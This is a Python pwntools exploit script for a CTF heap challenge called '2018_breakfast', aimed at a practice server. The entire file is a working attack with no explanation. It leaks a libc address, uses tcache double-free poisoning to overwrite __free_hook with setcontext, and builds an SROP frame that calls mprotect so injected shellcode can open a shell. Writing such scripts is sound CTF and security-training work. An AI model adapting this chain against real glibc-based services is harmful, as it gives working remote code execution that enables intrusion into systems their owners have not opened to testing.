import sys
from pwn import *
from ctypes import *
from pwn_debug.pwn_debug import *
binary='2018_breakfast'
elf=ELF(binary)
pdbg=pwn_debug(binary)
pdbg.local("/lib/x86_64-linux-gnu/libc.so.6")
pdbg.debug("2.27")
pdbg.remote('node3.buuoj.cn',27353)
pdbg.context.log_level='debug'
while True :
	# try :
		if len(sys.argv)==1 :
			io=pdbg.run("debug")
			# io=pdbg.run("local")
			libc=pdbg.libc
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
		else :
			io=pdbg.run("remote")
			libc=ELF('../../x64libc/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]


		def add(a,b):
			io.sendlineafter('5.- Exit','1')
			io.sendlineafter('Enter the position of breakfast',str(a))
			io.sendlineafter('Enter the size in kcal.',str(b))

		def delete(a):
			io.sendlineafter('5.- Exit','4')
			io.sendlineafter('Introduce the menu to delete',str(a))

		def edit(a,c):
			io.sendlineafter('5.- Exit','2')
			io.sendlineafter('Introduce the menu to ingredients',str(a))
			io.sendafter('Enter the ingredients',c)

		def show(a):
			io.sendlineafter('5.- Exit','3')
			io.sendlineafter('Enter the breakfast to see',str(a))
		

		add(0,0x68)
		add(1,0x69)
		add(2,0x69)
		add(3,0x69)
		add(4,0x50)
		add(5,0x69)
		add(6,0x10)
		add(7,0x69)
		add(8,0x69)
		add(8,0x69)
		add(8,0x69)
		add(8,0x69)
		add(8,0x69)
		add(8,0x69)
		delete(0)
		delete(0)
		edit(0,'\xc0')
		add(9,0x68)
		add(10,0x68)
		edit(10,p64(0)+p64(0x501))
		delete(1)
		show(1)
		io.recvline()
		io.recv(0x20)
		libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-96-0x20
		libc.address=libc_base
		system_addr=libc.sym['execve']
		bin_sh_addr=libc.search('/bin/sh\x00').next()
		delete(0)
		edit(0,p64(libc.sym['__free_hook']))
		add(11,0x68)
		add(12,0x68)
		free_hook_addr=libc.sym['__free_hook']
		new_shell_code_head_addr=free_hook_addr&0xfffffffffffff000
		pay=p64(libc.sym['setcontext']+53)+p64(free_hook_addr+0x10)+asm(shellcraft.sh())
		edit(12,pay)
		srop_mprotect=SigreturnFrame()
		srop_mprotect.rsp=free_hook_addr+0x8
		srop_mprotect.rdi=new_shell_code_head_addr
		srop_mprotect.rsi=0x1000
		srop_mprotect.rdx=4|2|1
		srop_mprotect.rip=libc.sym['mprotect']
		edit(5,str(srop_mprotect)[0x60:0xc0])
		delete(4)
		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue